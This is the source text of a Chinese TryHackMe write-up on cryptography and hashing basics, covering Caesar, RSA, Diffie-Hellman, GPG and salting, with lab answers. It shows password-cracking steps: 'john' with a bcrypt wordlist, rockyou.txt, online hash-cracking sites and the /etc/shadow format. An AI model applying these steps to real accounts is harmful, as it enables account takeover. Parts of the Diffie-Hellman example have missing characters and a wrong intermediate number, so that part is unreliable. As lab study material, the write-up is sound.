)是密码用于加密或解密数据的一串位。一般来说，使用的密码是公开的；但是，除非密钥是非对称加密中的公钥，否则它必须保密。我们将在后面的任务中讨论非对称加密。</p>\n</li>\n<li><p>加密(Encryption)是使用密码和密钥将明文转换为密文的过程。与密钥不同，密码的选择是公开的。</p>\n</li>\n<li><p>解密(Decryption)是加密的逆过程，使用密码和密钥将密文重新转换为明文。尽管密码是公开的，但在不知道密钥的情况下恢复明文应该是不可能的（不可行）</p>\n</li>\n</ul>\n<p>来看看加密和解密的图解</p>\n<p>此为加密<br><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/en.png\" alt=\"task\"></p>\n<p>此为解密<br><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/de.png\" alt=\"task\"></p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>看两个问题</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/task3.png\" alt=\"task3\"></p>\n<p>第一个 毋庸置疑 密文(ciphertext)</p>\n<p>第二个 转化为明文就是解密</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>凯撒密码 顾名思义就是凯撒搞出来的加密方法 将每个字母移动一定数字来加密消息</p>\n<p>分为明文 偏移量 密码<br>举例：</p>\n<ul>\n<li>假设明文为ikun</li>\n<li>偏移量为3(像右3个字母)</li>\n<li>密码为lnxq</li>\n</ul>\n<p>假设知道密文和偏移量 也能倒推出明文</p>\n<p>来试试看吧</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/task4.png\" alt=\"task4\"></p>\n<p>可以试试这个<a href=\"https://www.dcode.fr/caesar-cipher\">网站</a> 相信很多师傅都有这种密码破解的 一下子梭出来了</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/depy.png\" alt=\"task\"></p>\n<p>第一个就是答案</p>\n<h2 id=\"加密类型\"><a href=\"#加密类型\" class=\"headerlink\" title=\"加密类型\"></a>加密类型</h2><p>分为对称加密和非对称加密</p>\n<p>对称加密，使用相同的密钥来加密和解密数据，</p>\n<p>特点：</p>\n<ul>\n<li>密钥相同：发送和接收双方共享一个密钥，因此加密和解密过程都依赖于相同的密钥。</li>\n<li>速度较快：对称加密算法通常计算速度较快，适用于加密大量数据。</li>\n<li>密钥管理问题：因为密钥是共享的，密钥的分发和管理需要非常小心，密钥一旦泄漏，所有加密的数据都可能被破解</li>\n</ul>\n<p>常用的对称加密DES 3DES AES RC4</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/duicheng.png\" alt=\"task\"></p>\n<p>非对称加密<br>又称公钥加密<br>非对称加密使用一对密钥：公钥（Public Key）和 私钥（Private Key）。公钥用于加密，私钥用于解密。加密和解密使用不同的密钥。</p>\n<ul>\n<li>加密：发送方使用接收方的公钥对数据进行加密。</li>\n<li>解密：接收方使用自己的私钥对数据进行解密。</li>\n</ul>\n<p>特点：</p>\n<ul>\n<li>密钥不同：加密和解密使用不同的密钥，其中公钥可以公开，而私钥必须保密。</li>\n<li>安全性高：即使公钥被泄露，也无法通过公钥解密数据，只有私钥能解密。</li>\n<li>速度较慢：由于非对称加密算法的计算复杂度较高，因此相对于对称加密，非对称加密速度较慢，通常用于加密少量数据，如传输密钥。</li>\n</ul>\n<p>常见的非对称加密有RSA DSA Diffie-Hellman ecc</p>\n<h2 id=\"基础计算\"><a href=\"#基础计算\" class=\"headerlink\" title=\"基础计算\"></a>基础计算</h2><p>异或计算</p>\n<p>XOR是“异或”的缩写，是二进制算术中的逻辑运算，在各种计算和加密应用中起着至关重要的作用。在二进制中，XOR比较两个位，如果位不同则返回 1，如果位相同则返回0，</p>\n<p>我们要对二进制数 1010 和 1100 进行异或运算。在这种情况下，我们逐位执行操作：1 ⊕ 1 &#x3D; 0、0 ⊕ 1 &#x3D; 1、1 ⊕ 0 &#x3D; 1 和 0 ⊕ 0 &#x3D; 0，结果为 0110。</p>\n<p>模运算 </p>\n<p>步骤：</p>\n<ul>\n<li>除法运算：将 a 除以 b。</li>\n<li>求余数：计算除法后的余数。</li>\n</ul>\n<p>例子 2：15 % 4<br>除法运算：15 ÷ 4 &#x3D; 3，商是 3。<br>求余数：15 - (4 × 3) &#x3D; 15 - 12 &#x3D; 3，所以 15 % 4 &#x3D; 3。</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/task6.png\" alt=\"task6\"></p>\n<p>异或计算就是每个相对应的位数 分别计算 相同为0 不同为1</p>\n<p>1⊕1&#x3D;0<br>0⊕0&#x3D;0<br>0⊕1&#x3D;1<br>1⊕0&#x3D;1</p>\n<p>第一问答案就是0011</p>\n<p>第二问可以到<a href=\"https://www.wolframalpha.com/\">这里</a>计算</p>\n<p>第三问 因为60可以与12整除 余数为0</p>\n<h1 id=\"Public-Key-Cryptography-Basics\"><a href=\"#Public-Key-Cryptography-Basics\" class=\"headerlink\" title=\"Public Key Cryptography Basics\"></a>Public Key Cryptography Basics</h1><p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/public%20key.png\" alt=\"task\"></p>\n<p>网络通信中要注意</p>\n<ul>\n<li>身份验证：确保与正确的人进行交流，而不是与其他人假装的交流。</li>\n<li>真实性：可以验证信息是否来自所声称的来源。</li>\n<li>完整性：必须确保没有人更改您交换的数据。</li>\n<li>保密性：想防止未经授权的一方窃听您的谈话。</li>\n</ul>\n<p>这个章节主要是讲公钥加密 也就是非对称加密</p>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p>非对称加密其实就有点像你放了一个信到一个上锁的信箱里面。每个人都可以放信进去 但是只有你才能打开信箱的锁拿出信来看内容</p>\n<p>公钥就是信箱的投递口<br>私钥就是取信的钥匙</p>\n<h2 id=\"task3-1\"><a href=\"#task3-1\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>来认识认识rsa</p>\n<p>rsa的计算过程</p>\n<ol>\n<li>Bob 选择了两个素数：p  &#x3D; 157和q  &#x3D; 199。他计算出n  &#x3D;  p  ×  q  &#x3D; 31243。</li>\n<li>假设ϕ ( n ) &#x3D;  n  −  p  −  q  + 1 &#x3D; 31243 − 157 − 199 + 1 &#x3D; 30888，Bob 选择e  &#x3D; 163 ，使得e与ϕ ( n )互质；此外，他选择d  &#x3D; 379，其中e  ×  d  &#x3D; 1 mod ϕ ( n )，即e  ×  d  &#x3D; 163 × 379 &#x3D; 61777且61777 mod 30888 &#x3D; 1。公钥为( n , e )，即(31243,163)，私钥为 $(n,d) ，即(31243,379)。</li>\n<li>假设他们想要加密的值是x  &#x3D; 13，那么 Alice 将计算并发送y  &#x3D;  x e mod n  &#x3D; 13 163 mod 31243 &#x3D; 16341。</li>\n<li>Bob 将通过计算x  &#x3D;  y d mod n  &#x3D; 16341 379 mod 31243 &#x3D; 13来解密收到的值。这样，Bob 就恢复了 Alice 发送的值。</li>\n</ol>\n<p>看看问题</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task3.png\" alt=\"task3\"></p>\n<p>也是醉了 出了个寂寞</p>\n<p>第一问就是4391*6659&#x3D;29239669</p>\n<p>第二问就是29239669-4391-6659+1&#x3D;29228620</p>\n<p>分别是第一步和第二步的开头</p>\n<h2 id=\"task4-1\"><a href=\"#task4-1\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>Diffie-Hellman Key Exchange 简称就叫dh协议 密钥交换</p>\n<p>密钥交换旨在在双方之间建立共享秘密。这是一种允许双方在非安全通信信道上建立共享秘密的方法，无需预先存在共享秘密，观察者也无法获取此密钥。因此，此共享密钥可用于后续通信中的对称加密。</p>\n<p>研究一下具体的过程。</p>\n<p>步骤 1: 公共材料<br>Alice 和 Bob 确定一个公共的素数p 和一个公共的生成器g，这两者对双方都是公开的。假设我们选择：<br>p &#x3D; 29（一个素数）<br>g &#x3D; 3（生成器）<br>这些值是公开的，任何人都可以知道它们。</p>\n<p>步骤 2: Alice 和 Bob 各自选择私钥<br>Alice 选择一个私钥 a，并且不能告诉别人。假设 Alice 选择了私钥 a &#x3D; 13。<br>Bob 选择一个私钥 b，并且也不会告诉别人。假设 Bob 选择了私钥 b &#x3D; 15。<br>这些私钥是保密的，只由 Alice 和 Bob 知道。</p>\n<p>步骤 3: 计算公钥<br>根据 Diffie-Hellman 的规则，每个人使用自己的私钥来计算公钥：</p>\n<p>Alice 的公钥：A &#x3D; g^a mod p<br>A &#x3D; 3^13 mod 29<br>计算 3^13 mod 29：<br>3^13 &#x3D; 1594323，<br>然后 A mod p<br>1594323 mod 29 &#x3D; 19<br>所以 Alice 的公钥是 A &#x3D; 19。</p>\n<p>Bob 的公钥：B &#x3D; g^b mod p<br>B &#x3D; 3^15 mod 29<br>计算 3^15 mod 29：<br>3^15 &#x3D; 14348907，<br>然后 B mod p<br> 14348907 mod 29 &#x3D; 26<br>所以 Bob 的公钥是 B &#x3D; 26。</p>\n<p>步骤 4: Alice 和 Bob 交换公钥<br>Alice 发送自己的公钥 A &#x3D; 19 给 Bob。<br>Bob 发送自己的公钥 B &#x3D; 26 给 Alice。<br>这时，Alice 和 Bob 都拥有对方的公钥。</p>\n<p>步骤 5: 计算共享密钥<br>Alice 和 Bob 使用自己私有的密钥 的公钥来计算共享密钥：</p>\n<p>Alice 的计算：<br>Alice 收到 Bob 的公钥 B &#x3D; 26，然    算 B^a mod p：<br>B^a mod p &#x3D; 26^13 mod 29<br>计算 26^13 mod 29：<br>26^13 &#x3D; 10460353203，然后 104603    mod 29 &#x3D; 10<br>所以 Alice 得到的共享密钥是 10。    </p>\n<p>Bob 的计算：<br>Bob 收到 Alice 的公钥 A &#x3D; 19，然    算 A^b mod p：<br>A^b mod p &#x3D; 19^15 mod 29<br>计算 19^15 mod 29：<br>19^15 &#x3D; 41821194261，然后 418211    mod 29 &#x3D; 10<br>所以 Bob 得到的共享密钥是 10。</p>\n<p>步骤 6: 完成<br>最终，Alice 和 Bob 都得到了相同 密钥 10，并且可以用它来进行后续的加密通信。</p>\n<p>看看图解</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/dh.png\" alt=\"dh\"></p>\n<p>来练练手</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task4.png\" alt=\"dh\"></p>\n<p>三四问可以在<a href=\"https://www.wolframalpha.com/\">这里</a>进行计算</p>\n<p>第一问<br>p&#x3D;29<br>g&#x3D;5<br>a&#x3D;12</p>\n<p>A &#x3D; g^a mod p<br>A &#x3D; 5^12 mod 29<br>A &#x3D; 244140625 mod 29 &#x3D; 7</p>\n<p>第二问 一样<br>b&#x3D;17<br>其他都一样<br>B &#x3D; g^b mod p<br>B &#x3D; 5^17 mod 29 &#x3D; 9</p>\n<p>第三问<br>已知p  &#x3D; 29，a  &#x3D; 12，并且从第二个问题得到B，那么 Bob 计算出的密钥是什么？ </p>\n<p>key &#x3D; B^a mod p<br>key &#x3D; 9^ 12 mod 29 &#x3D;24</p>\n<p>第四问<br>已知p  &#x3D; 29，b  &#x3D; 17，并且从第一个问题得到A，那么 Alice 计算出的密钥是什么？</p>\n<p>key &#x3D; A^b mod p<br>key &#x3D; 7^17 mod 29 &#x3D;24</p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>讲的是ssh秘钥</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/rsa.png\" alt=\"task5\"></p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task5.png\" alt=\"task5\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>数字签名和证书<br>数字签名提供了一种验证数字消息或文档真实性和完整性的方法。数字签名和物理签名​​具有相同的法律效力。</p>\n<p>证书是公钥加密技术的一个重要应用，它们也与数字签名相关。它们最常用于 HTTPS</p>\n<p>证书有一个信任链，从根 CA（证书颁发机构）开始。</p>\n<p>问题就跳过了 文章都是可以找到的</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>PGP和GPG<br>PGP代表 Pretty Good Privacy。它是一种实现加密的软件，用于加密文件、执行数字签名等。GnuPG或GPG是 OpenPGP 标准的开源实现。</p>\n<p>看看问题</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task77.png\" alt=\"task77\"></p>\n<p>需要我们导入密钥 然后解密就可以了</p>\n<p><img src=\"/source/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/task7.png\" alt=\"task7\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gpg --import tryhackme.key</span><br><span class=\"line\">gpg --decrypt message.gpg</span><br></pre></td></tr></table></figure>\n\n<p>到此第二部分也简单介绍到这里</p>\n<h1 id=\"Hashing-Basics\"><a href=\"#Hashing-Basics\" class=\"headerlink\" title=\"Hashing Basics\"></a>Hashing Basics</h1><p>哈希值是由哈希函数计算的固定大小的字符串或字符。哈希函数接受任意大小的输入并返回固定长度的输出，即哈希值。</p>\n<p>我们也能通过对比hash值来判断下载的副本是否与原始文件完全相同</p>\n<h2 id=\"task2-1\"><a href=\"#task2-1\" class=\"headerlink\" title=\"task2\"></a>task2</h2><h3 id=\"什么是哈希函数\"><a href=\"#什么是哈希函数\" class=\"headerlink\" title=\"什么是哈希函数\"></a>什么是哈希函数</h3><p>哈希函数不同于加密。它没有密钥，并且不可能（或计算上不切实际）从输出返回到输入。输出具有固定大小。</p>\n<h3 id=\"什么是哈希碰撞\"><a href=\"#什么是哈希碰撞\" class=\"headerlink\" title=\"什么是哈希碰撞\"></a>什么是哈希碰撞</h3><p>哈希碰撞是指两个不同的输入产生相同的输出。</p>\n<h3 id=\"题\"><a href=\"#题\" class=\"headerlink\" title=\"题\"></a>题</h3><p>来看看题</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task2.png\" alt=\"task2\"></p>\n<p>第一问问照片的sha256值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sha256sum passport.jpg</span><br></pre></td></tr></table></figure>\n<p>来获得照片的sha256的值</p>\n<p>第二问<br>md5能输出一个128位(16字节)的散列值 答案就是16</p>\n<p>第三问<br>八位hash输出 可以当成2^8&#x3D;256</p>\n<h2 id=\"task3-2\"><a href=\"#task3-2\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>身份验证的密码存储不安全</p>\n<p>密码方面的三种不安全做法：</p>\n<ul>\n<li>以明文形式存储密码</li>\n<li>使用已弃用的加密方式存储密码</li>\n<li>使用不安全的哈希算法存储密码</li>\n</ul>\n<p>这个问就是找密码</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task3.png\" alt=\"task3\"></p>\n<p>问第20个密码是啥 直接head 查到第二十个就行了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">head -n 20 rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/mima.png\" alt=\"task3\"></p>\n<h2 id=\"task4-2\"><a href=\"#task4-2\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>使用哈希存储密码</p>\n<p>Rainbow Table 彩虹表(彩虹表是哈希到明文的查找表) 因此您可以从哈希中快速找出用户刚刚拥有的密码。</p>\n<p><a href=\"https://crackstation.net/\">crackstation</a> 和<a href=\"https://hashes.com/en/decrypt/hash\">hashes.com</a>能给我们帮助<br>内部使用大量彩虹表来提供快速破解无盐哈希密码的功能。</p>\n<p>这个时候要提一嘴了 什么是加盐</p>\n<p>加盐是指在加密过程中，向原始数据（通常是密码）中添加一个随机生成的字符串（即“盐”），然后再进行加密。</p>\n<p>这个随机字符串通常是唯一的，并且与原始数据一起存储。 加盐的目的是增加加密数据的复杂性，使得即使两个相同的密码，其加密结果也会不同。</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task4.png\" alt=\"task4\"></p>\n<p>问题一<br>我们能在上面的表上查到</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/caihong.png\" alt=\"task4\"></p>\n<p>问题二</p>\n<p>我们把hash值复制到<a href=\"https://hashes.com/en/decrypt/hash\">hashes.com</a>能破解出结果</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/tryhackme.png\" alt=\"task4\"></p>\n<h2 id=\"task5-1\"><a href=\"#task5-1\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>识别密码哈希值</p>\n<p>在Linux上，密码哈希存储在 中&#x2F;etc&#x2F;shadow，通常只有 root 才能读取。它们过去存储在 中&#x2F;etc&#x2F;passwd，每个人都可以读取。</p>\n<p>该shadow文件包含密码信息。每行包含九个字段，以冒号 ( :) 分隔。前两个字段是登录名和加密密码。</p>\n<p>加密密码字段包含哈希密码，该密码由四个部分组成：前缀（算法 ID）、选项（参数）、盐和哈希。</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task5.png\" alt=\"task5\"></p>\n<p>第一问遇事不决直接百度 能查出是256的大小</p>\n<p>第二问和第三问 我们在<a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">Hashcat 示例</a>能找到我们要的答案</p>\n<p>第二问</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/2410.png\" alt=\"task5\"></p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/scrypt.png\" alt=\"task5\"></p>\n<h2 id=\"task6-1\"><a href=\"#task6-1\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>密码破解</p>\n<p>可以在<a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">hashcat</a>和<a href=\"https://www.openwall.com/john/\">John the Ripper</a>这两个工具上</p>\n<p>第一个最好在主机上搞 榨干全部性能</p>\n<p><a href=\"https://www.tunnelsup.com/hash-analyzer/\">哈希分析</a></p>\n<p>来试试手</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task6.png\" alt=\"task6\"></p>\n<p>第一问<br>我们用john来破解<br>$2a$就是bcrypt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john hash.txt -format=bcrypt -wordlist=/usr/share/wordlists</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/850.png\" alt=\"task6\"></p>\n<p>能破解出85208520</p>\n<p>第二 三 四问 我们都可以在<a href=\"https://hashes.com/en/decrypt/hash\">这里</a>去破解</p>\n<p>主要是不知道为啥这个机子的john很抽象 就只能在网站那破解</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/holl.png\" alt=\"task6\"></p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/spaceman.png\" alt=\"task6\"></p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/funforyou.png\" alt=\"task6\"></p>\n<h2 id=\"task7-1\"><a href=\"#task7-1\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/task7.png\" alt=\"task7\"></p>\n<p>第一问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sha256sum </span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/2561.png\" alt=\"task7\"></p>\n<p>第二问<br><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/hash/512.png\" alt=\"task7\"></p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>使用base64解码RU5jb2RlREVjb2RlCg&#x3D;&#x3D;</p>\n<p>把这串复制到<a href=\"https://gchq.github.io/CyberChef/\">cyberchef</a>里面能得出解码：ENcodeDEcode</p>\n<p>第三部分就这样结束了 后面还会补充多点内容 </p>\n","excerpt":"","more":"<p>话说回来 来到了密码学专区了</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/title1.png\" alt=\"title\"></p>\n<p>密码学在生活中无处不在</p>\n<h1 id=\"cyptography-basics\"><a href=\"#cyptography-basics\" class=\"headerlink\" title=\"cyptography basics\"></a>cyptography basics</h1><p>来看看密码学的一些术语</p>\n<ul>\n<li><p>明文(Plaintext)是加密前的原始可读消息或数据。它可以是文档、图像、多媒体文件或任何其他二进制数据。</p>\n</li>\n<li><p>密文(Ciphertext)是加密后的消息的混乱且不可读的版本。理想情况下，我们无法获得有关原始明文的任何信息，除了其大致大小。</p>\n</li>\n<li><p>密码(Cipher)是一种将明文转换为密文并再转换回明文的算法或方法。密码通常由数学家开发。</p>\n</li>\n<li><p>密钥(Key )是密码用于加密或解密数据的一串位。一般来说，使用的密码是公开的；但是，除非密钥是非对称加密中的公钥，否则它必须保密。我们将在后面的任务中讨论非对称加密。</p>\n</li>\n<li><p>加密(Encryption)是使用密码和密钥将明文转换为密文的过程。与密钥不同，密码的选择是公开的。</p>\n</li>\n<li><p>解密(Decryption)是加密的逆过程，使用密码和密钥将密文重新转换为明文。尽管密码是公开的，但在不知道密钥的情况下恢复明文应该是不可能的（不可行）</p>\n</li>\n</ul>\n<p>来看看加密和解密的图解</p>\n<p>此为加密<br><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/en.png\" alt=\"task\"></p>\n<p>此为解密<br><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/de.png\" alt=\"task\"></p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>看两个问题</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/task3.png\" alt=\"task3\"></p>\n<p>第一个 毋庸置疑 密文(ciphertext)</p>\n<p>第二个 转化为明文就是解密</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>凯撒密码 顾名思义就是凯撒搞出来的加密方法 将每个字母移动一定数字来加密消息</p>\n<p>分为明文 偏移量 密码<br>举例：</p>\n<ul>\n<li>假设明文为ikun</li>\n<li>偏移量为3(像右3个字母)</li>\n<li>密码为lnxq</li>\n</ul>\n<p>假设知道密文和偏移量 也能倒推出明文</p>\n<p>来试试看吧</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/task4.png\" alt=\"task4\"></p>\n<p>可以试试这个<a href=\"https://www.dcode.fr/caesar-cipher\">网站</a> 相信很多师傅都有这种密码破解的 一下子梭出来了</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/depy.png\" alt=\"task\"></p>\n<p>第一个就是答案</p>\n<h2 id=\"加密类型\"><a href=\"#加密类型\" class=\"headerlink\" title=\"加密类型\"></a>加密类型</h2><p>分为对称加密和非对称加密</p>\n<p>对称加密，使用相同的密钥来加密和解密数据，</p>\n<p>特点：</p>\n<ul>\n<li>密钥相同：发送和接收双方共享一个密钥，因此加密和解密过程都依赖于相同的密钥。</li>\n<li>速度较快：对称加密算法通常计算速度较快，适用于加密大量数据。</li>\n<li>密钥管理问题：因为密钥是共享的，密钥的分发和管理需要非常小心，密钥一旦泄漏，所有加密的数据都可能被破解</li>\n</ul>\n<p>常用的对称加密DES 3DES AES RC4</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/duicheng.png\" alt=\"task\"></p>\n<p>非对称加密<br>又称公钥加密<br>非对称加密使用一对密钥：公钥（Public Key）和 私钥（Private Key）。公钥用于加密，私钥用于解密。加密和解密使用不同的密钥。</p>\n<ul>\n<li>加密：发送方使用接收方的公钥对数据进行加密。</li>\n<li>解密：接收方使用自己的私钥对数据进行解密。</li>\n</ul>\n<p>特点：</p>\n<ul>\n<li>密钥不同：加密和解密使用不同的密钥，其中公钥可以公开，而私钥必须保密。</li>\n<li>安全性高：即使公钥被泄露，也无法通过公钥解密数据，只有私钥能解密。</li>\n<li>速度较慢：由于非对称加密算法的计算复杂度较高，因此相对于对称加密，非对称加密速度较慢，通常用于加密少量数据，如传输密钥。</li>\n</ul>\n<p>常见的非对称加密有RSA DSA Diffie-Hellman ecc</p>\n<h2 id=\"基础计算\"><a href=\"#基础计算\" class=\"headerlink\" title=\"基础计算\"></a>基础计算</h2><p>异或计算</p>\n<p>XOR是“异或”的缩写，是二进制算术中的逻辑运算，在各种计算和加密应用中起着至关重要的作用。在二进制中，XOR比较两个位，如果位不同则返回 1，如果位相同则返回0，</p>\n<p>我们要对二进制数 1010 和 1100 进行异或运算。在这种情况下，我们逐位执行操作：1 ⊕ 1 &#x3D; 0、0 ⊕ 1 &#x3D; 1、1 ⊕ 0 &#x3D; 1 和 0 ⊕ 0 &#x3D; 0，结果为 0110。</p>\n<p>模运算 </p>\n<p>步骤：</p>\n<ul>\n<li>除法运算：将 a 除以 b。</li>\n<li>求余数：计算除法后的余数。</li>\n</ul>\n<p>例子 2：15 % 4<br>除法运算：15 ÷ 4 &#x3D; 3，商是 3。<br>求余数：15 - (4 × 3) &#x3D; 15 - 12 &#x3D; 3，所以 15 % 4 &#x3D; 3。</p>\n<p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/task6.png\" alt=\"task6\"></p>\n<p>异或计算就是每个相对应的位数 分别计算 相同为0 不同为1</p>\n<p>1⊕1&#x3D;0<br>0⊕0&#x3D;0<br>0⊕1&#x3D;1<br>1⊕0&#x3D;1</p>\n<p>第一问答案就是0011</p>\n<p>第二问可以到<a href=\"https://www.wolframalpha.com/\">这里</a>计算</p>\n<p>第三问 因为60可以与12整除 余数为0</p>\n<h1 id=\"Public-Key-Cryptography-Basics\"><a href=\"#Public-Key-Cryptography-Basics\" class=\"headerlink\" title=\"Public Key Cryptography Basics\"></a>Public Key Cryptography Basics</h1><p><img src=\"/images/tryhackme-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/public%20key/public%20key.png\" alt=\"task\"></p>\n<p>网络通信中要注意</p>\n<ul>\n<li>身份验证：确保与正确的人进行交流，而不是与其他人假装的交流。</li>\n<li>真实性：可以验证信息是否来自所声称的来源。</li>\n<li>完整性：必须确保没有人更改您交换的数据。</li>\n<li>保密性：想防止未经授权的一方窃听您的谈话。</li>\n</ul>\n<p>这个章节主要是讲公钥加密 也就是非对称加密</p>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p>非对称加密其实就有点像你放了一个信到一个上锁的信箱里面。每个人都可以放信进去 但是只有你才能打开信箱的锁拿出信来看内容</p>\n<p>公钥就是信箱的投递口<br>私钥就是取信的钥匙</p>\n<h2 id=\"task3-1\"><a href=\"#task3-1\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>来认识认识rsa</p>\n<p>rsa的计算过程</p>\n<ol>\n<li>Bob 选择了两个素数：p  &#x3D; 157和q  &#x3D; 199。他计算出n  &#x3D;  p  ×  q  &#x3D; 31243。</li>\n<li>假设ϕ ( n ) &#x3D;  n  −  p  − 